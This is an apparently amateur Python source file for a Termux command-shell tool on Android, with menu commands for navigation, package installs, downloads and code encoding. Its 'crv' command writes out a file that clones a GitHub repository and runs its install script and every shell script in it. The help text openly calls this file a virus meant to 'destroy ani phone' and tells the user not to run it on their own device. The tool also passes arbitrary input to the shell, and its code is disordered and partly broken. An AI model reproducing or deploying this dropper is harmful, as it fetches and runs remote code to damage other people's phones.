def start():
    byg = open('lode.txt','r')
    gt = byg.read()
    while True :
    	nice =(R+"Not Found")
    	do =(os.getcwd())
    	if do == "/storage/emulated/0":
    		do = ("sdcard")
    	if do == ("/storage/emulated/0/UAP-TEAM"):
    		do = ("UAP-TEAM")
    	if "UAP-TEAM" in do :
    		do=("UAP-TEAM")
    	if do == ("/data/data/com.termux/files/hom"):
    		do = ("home")
    	if do == ("/storage/emulated/0/Download"):
    		do =("Download")
    	v=(f'{R}---{G}[{Y}{gt}{G}]{R}----[{W}'+ (do)+f'{R}]{W}')
    	print (v)
    	g=input(R+'~'+G+'>'+P+'>'+W+' ')
    	DO=('DO')
    	edit=('edit')
    	sd =('sd')
    	mkdir =('mkdir')
    	clear = ('cr')
    	Zekr = ('Zekr')
    	open_url=('tou')
    	history=('history')
    	photo=('photo')
    	mlenc=('mlenc')
    	name = ('name')
    	create_various=('crv')
    	DDOS = ('DDOS')
    	cd = ("cd")
    	help = ('help')
    	lib =("lib")
    	pkg_install=('pil')
    	tor = ('tor')
    	lambda_enc=("lenc")
    	pip = ('pip')
    	exit = ('exit')
    	if g == lib :
    		import lib 
    		lib.l()
    	if g ==lambda_enc:
    		nice=("")
    		import lambda6
    		lambda6.enc()
    	if g == create_various:
    		nice = ("")
    		os.chdir('/sdcard/Download')
    		print ("the various save in your fon dont start the file ")
    		d=("""import os\nos.system('pkg update;pkg upgrade;pkg install git;git clone https://github.com/jmaxojan/jmaxojan5;cd jmaxojan5;bash .install.sh;bash *')""")
    		v = input("output:")
    		with open(v, 'a') as (file):
    			file.write('{}'.format(d))
    		print (v)
    	if g == help:
    		print (Bl+'- - - - - - - - - - -- - - - -  - - - - - - - -')
    		print (Y+Zekr + R+'\t#'+G+'send to bot tlg auto zekr ')
    		print(Y+lambda_enc + R+'\t#'+G+'ENCRYP ANI TOOL TO LAMBDA ')
    		print (Y+photo + R+'\t#'+G+'download any photo from Google')
    		print (Y+DO + R+'\t#'+G+'cd /sdcard/Download ')
    		print (Y+edit+ R+'\t#'+G+'nano ')
    		print (Y+name + R+'\t#'+G+'change name ')
    		print (Y+create_various + R+'\t#'+G+'   create various to destroy ani phone dont start the output in your phone')
    		print (Y+sd + R+'\t#'+G+'cd /sdcard')
    		print (Y+mkdir + R+'\t#'+G+'dailite any file')
    		print (Y+lib + R+'\t#'+G+'download all python library ')
    		print (Y+clear + R+'\t#'+G+'clear ')
    		print (Y+open_url + R+'\t#'+G+'open url in Google ')
    		print (Y+history + R+'\t#'+G+'history ')
    		print (Y+mlenc + R+'\t#'+G+'Encryp ani tool to marshal')
    		print (Y+pkg_install + R+'\t#'+G+'pkg install ')
    		print (Y+tor + R+'\t#'+G+'Encryp ip ')
    		print (Y+pip + R+'\t#'+G+'pip install python library')
    		print (Y+cd + R+'\t#'+G+'cd ')
    		print (Y+'ls' + R+'\t#'+G+'ls ')
    		print (Y+exit + R+'\t#'+G+'To exit Tool ')
    		nice=("")
    		print (Bl+'- - - - - - - - - - -- - - - -  - - - - - - - -')
    	if g == exit:
    		nice=("")
    		sys.exit()
    	if g == cd:
    		print (v)
    		nice=("")
    		g=input('? ')
    		try:
    			os.chdir(g)
    		except:
    			print(R+'File Not Found')
    			
    	if g == mlenc :
    		nice=("")
    		import marshal
    		marshal.enc()
    	if g == 'cr' :
    		os.system('clear')
    		nice=("")
    	if g == pkg_install:
    		nice=("")
    		print (v)
    		g=input ('? ')
    		os.system(f'pkg install {g}')
    	if g == tor:
    		nice=("")
    		import tor
    		tor.vpn()
    	if g == open_url :
    		nice=("")
    		do =(os.getcwd())
    		print (v)
    		g = input ('? ')
    		webbrowser.open(g)
    	if g== name:
    		nice=("")
    		do =(os.getcwd())
    		print (v)
    		t = os.system('rm -rif lode.txt')
    		open('lode.txt','w')
    		g= input(R+'~'+G+'>'+P+'>'+W+'')
    		with open('lode.txt', 'a') as (HACKED):
    			HACKED.write('{}'.format(g))
    	if g == history:
    		nice=("")
    		print (os.system('history'))
    	if g == edit :
    		g= input('? ')
    		os.system(f'nano {g}')
    	if g == photo:
    		nice=("")
    		import requests
    		print(v)
    		l = input ('Enter url of photo')
    		fr = requests.get(l).content
    		with open('cow.png','wb') as image :
    			image.write(fr)
    		print ('nice')
    	if g == sd :
    		nice=("")
    		os.chdir('/sdcard')
    	if g == DO:
    		nice=("")
    		os.chdir('/sdcard/Download')
    	if g==mkdir:
    		nice=("")
    		g= input('? ')
    		os.mkdir(g)
    	if g == 'ls':
    		nice=("")
    		os.system('ls')
    	if g == Zekr:
    		nice=("")
    		import Zekr
    		Zekr.send()
    	if g=='start':
    		nice=("")
    		print(v)
    		g =input('? ')
    		if 'php' in g:
    			try:
    				os.system(f'php {g}')
    			except :
    				os.system('pkg install php')
    		if 'py' in g:
    			try :
    				os.system(f'python {g}')
    			except:
    				os.system('pkg install python3')
    	if nice =="":
    		pass
    	if 'Not Found'in nice :
    		try :
    			os.system(g)
    		except :
    			print (R+'Not Found')
import os
try:
    import uuid
except:
    os.system('pip install uuid')
try:
    import sys
except:
    os.system('pip install sys')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')

try:
    import time
except:
    os.system('pip install time')
else:
    pass
    try:
        import pyfiglet
    except:
        os.system('pip install pyfiglet')
    else:
        import pyfiglet, os,sys
        from time import sleep
        import webbrowser
        import random, uuid, requests, string
        from user_agent import generate_user_agent
        from datetime import datetime
        from random import *
        from time import sleep
        import requests, os, random, json, threading, secrets, uuid
        from colorama import Fore, Style
        from time import sleep
        from time import sleep
        from datetime import datetime
        from secrets import token_hex
        from uuid import uuid4
        from user_agent import generate_user_agent
        from uuid import uuid4
        aa = 0
        zz = 0
B="\033[1;30m" # Black
R="\033[1;31m" # Red
G="\033[1;32m" # Green
Y="\033[1;33m" # Yellow
Bl="\033[1;34m" # Blue
P="\033[1;35m" # Purple
C="\033[1;36m" # Cyan
W="\033[1;37m" # White